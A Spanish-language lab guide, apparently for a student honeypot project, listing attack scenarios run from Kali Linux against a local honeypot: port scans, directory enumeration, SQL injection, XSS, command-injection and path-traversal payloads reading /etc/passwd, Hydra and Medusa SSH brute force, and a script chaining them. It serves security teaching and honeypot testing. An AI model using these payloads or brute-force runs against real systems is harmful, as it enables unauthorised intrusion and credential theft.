# 🧪 Attack Scenarios for Kali Linux

Esta guía contiene escenarios de ataque para probar tu honeypot desde Kali Linux.

## 🎯 Preparación

Desde Kali Linux, el honeypot está accesible en:
- **IP del host Windows**: `10.0.2.2` (si usas NAT)
- **Puerto HTTP**: `8080`
- **Puerto SSH**: `2222`

---

## Escenario 1: Reconocimiento Básico

### 1.1 Escaneo de Puertos con nmap

```bash
# Escaneo básico
nmap 10.0.2.2

# Escaneo de servicios y versiones
nmap -sV -p 8080,2222 10.0.2.2

# Escaneo completo con scripts
nmap -sC -sV -p- 10.0.2.2

# Escaneo agresivo
nmap -A -T4 10.0.2.2
```

**Qué registrará el honeypot**:
- Múltiples intentos de conexión
- Fingerprinting de servicios
- Geolocalización de tu IP

---

## Escenario 2: Enumeración Web

### 2.1 Escaneo con nikto

```bash
nikto -h http://10.0.2.2:8080
```

### 2.2 Búsqueda de directorios

```bash
# Con dirb
dirb http://10.0.2.2:8080 /usr/share/wordlists/dirb/common.txt

# Con gobuster
gobuster dir -u http://10.0.2.2:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Con ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.0.2.2:8080/FUZZ
```

### 2.3 Peticiones manuales

```bash
# Probar endpoints conocidos
curl http://10.0.2.2:8080/
curl http://10.0.2.2:8080/admin
curl http://10.0.2.2:8080/login
curl http://10.0.2.2:8080/wp-admin
curl http://10.0.2.2:8080/api/v1/users
curl http://10.0.2.2:8080/api/auth
```

---

## Escenario 3: Ataques de Inyección

### 3.1 SQL Injection Manual

```bash
# Inyección básica
curl "http://10.0.2.2:8080/login?user=admin' OR '1'='1"

# Union-based
curl "http://10.0.2.2:8080/login?id=1 UNION SELECT NULL,NULL,NULL--"

# Time-based
curl "http://10.0.2.2:8080/login?id=1' AND SLEEP(5)--"
```

### 3.2 SQL Injection con sqlmap

```bash
# Escaneo básico
sqlmap -u "http://10.0.2.2:8080/login?user=admin" --batch

# Más agresivo
sqlmap -u "http://10.0.2.2:8080/login?user=admin" --batch --level=5 --risk=3

# Intentar obtener bases de datos
sqlmap -u "http://10.0.2.2:8080/login?user=admin" --batch --dbs
```

### 3.3 XSS (Cross-Site Scripting)

```bash
# XSS reflejado
curl "http://10.0.2.2:8080/search?q=<script>alert('XSS')</script>"

# XSS con diferentes payloads
curl "http://10.0.2.2:8080/search?q=<img src=x onerror=alert(1)>"
curl "http://10.0.2.2:8080/search?q=<svg/onload=alert('XSS')>"
```

### 3.4 Command Injection

```bash
# Intentos de inyección de comandos
curl "http://10.0.2.2:8080/ping?host=127.0.0.1;ls"
curl "http://10.0.2.2:8080/ping?host=127.0.0.1|whoami"
curl "http://10.0.2.2:8080/ping?host=127.0.0.1&&cat /etc/passwd"
```

### 3.5 Path Traversal

```bash
# Intentos de path traversal
curl "http://10.0.2.2:8080/file?name=../../../etc/passwd"
curl "http://10.0.2.2:8080/download?file=....//....//....//etc/passwd"
```

---

## Escenario 4: Ataques SSH

### 4.1 Conexión Manual

```bash
# Intentar conectar
ssh -p 2222 admin@10.0.2.2

# Con usuario diferente
ssh -p 2222 root@10.0.2.2
ssh -p 2222 test@10.0.2.2
```

### 4.2 Fuerza Bruta con Hydra

```bash
# Crear lista de usuarios
echo -e "admin\nroot\nuser\ntest" > users.txt

# Crear lista de contraseñas
echo -e "admin\npassword\n123456\nroot" > passwords.txt

# Ataque de fuerza bruta
hydra -L users.txt -P passwords.txt ssh://10.0.2.2:2222

# Con wordlist de rockyou (si está disponible)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.2:2222 -t 4
```

### 4.3 Fuerza Bruta con Medusa

```bash
medusa -h 10.0.2.2 -n 2222 -u admin -P passwords.txt -M ssh
```

---

## Escenario 5: Análisis de Tráfico

### 5.1 Captura con tcpdump

```bash
# Capturar tráfico hacia el honeypot
sudo tcpdump -i eth0 host 10.0.2.2 -w honeypot_traffic.pcap

# Ver en tiempo real
sudo tcpdump -i eth0 host 10.0.2.2 -n
```

### 5.2 Análisis con Wireshark

```bash
# Abrir Wireshark y filtrar
wireshark &

# Filtro: ip.dst == 10.0.2.2
```

---

## Escenario 6: Fuzzing

### 6.1 HTTP Fuzzing con wfuzz

```bash
# Fuzz de parámetros
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt \
  "http://10.0.2.2:8080/login?user=FUZZ"

# Fuzz de rutas
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  "http://10.0.2.2:8080/FUZZ"
```

### 6.2 API Fuzzing

```bash
# Probar diferentes métodos HTTP
curl -X POST http://10.0.2.2:8080/api/v1/users
curl -X PUT http://10.0.2.2:8080/api/v1/users/1
curl -X DELETE http://10.0.2.2:8080/api/v1/users/1

# Con datos JSON
curl -X POST http://10.0.2.2:8080/api/auth \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"admin123"}'
```

---

## Escenario 7: Explotación Simulada

### 7.1 Metasploit (Simulación)

```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits SSH
search ssh

# Buscar exploits HTTP
search http
```

### 7.2 Burp Suite

```bash
# Iniciar Burp Suite
burpsuite &

# Configurar proxy en navegador: 127.0.0.1:8080
# Navegar a http://10.0.2.2:8080
# Interceptar y modificar peticiones
```

---

## Escenario 8: Ataques Combinados

### 8.1 Script de Ataque Automatizado

```bash
#!/bin/bash
# attack_honeypot.sh

TARGET="10.0.2.2"
HTTP_PORT="8080"
SSH_PORT="2222"

echo "[*] Iniciando ataque al honeypot..."

# Escaneo
echo "[1] Escaneando puertos..."
nmap -sV -p $HTTP_PORT,$SSH_PORT $TARGET

# Enumeración web
echo "[2] Enumerando directorios..."
dirb http://$TARGET:$HTTP_PORT /usr/share/wordlists/dirb/common.txt

# SQL Injection
echo "[3] Probando SQL Injection..."
curl "http://$TARGET:$HTTP_PORT/login?user=admin' OR '1'='1"

# XSS
echo "[4] Probando XSS..."
curl "http://$TARGET:$HTTP_PORT/search?q=<script>alert(1)</script>"

# SSH brute force
echo "[5] Probando SSH brute force..."
hydra -l admin -P passwords.txt ssh://$TARGET:$SSH_PORT -t 4

echo "[*] Ataque completado!"
```

---

## 📊 Verificar Resultados

Después de ejecutar los ataques, desde Windows:

```powershell
# Ver resumen de logs
python analyze_logs.py --summary

# Ver logs detallados
python analyze_logs.py --detailed --limit 50

# Exportar a CSV
python analyze_logs.py --export-csv attack_results.csv

# Ver top IPs
python analyze_logs.py --top-ips 10

# Ver logs en tiempo real
Get-Content honeypot.log -Wait
```

---

## 🎓 Objetivos de Aprendizaje

Al ejecutar estos escenarios aprenderás:

1. **Reconocimiento**: Cómo los atacantes descubren servicios
2. **Enumeración**: Técnicas para encontrar vulnerabilidades
3. **Explotación**: Diferentes tipos de ataques
4. **Detección**: Cómo identificar patrones de ataque
5. **Análisis**: Interpretar logs y tráfico de red

---

## ⚠️ Advertencias

- ✅ **Solo usa estos ataques contra TU PROPIO honeypot**
- ❌ **NUNCA** ataques sistemas que no te pertenecen
- ⚠️ **Ilegal**: Atacar sistemas sin permiso es un delito
- 📚 **Educativo**: Esto es solo para aprendizaje

---

## 🚀 Próximos Pasos

1. Ejecuta los escenarios básicos (1-3)
2. Analiza los logs generados
3. Prueba escenarios más avanzados (4-7)
4. Crea tus propios scripts de ataque
5. Mejora el honeypot basándote en lo aprendido

¡Diviértete aprendiendo ciberseguridad de forma ética! 🛡️
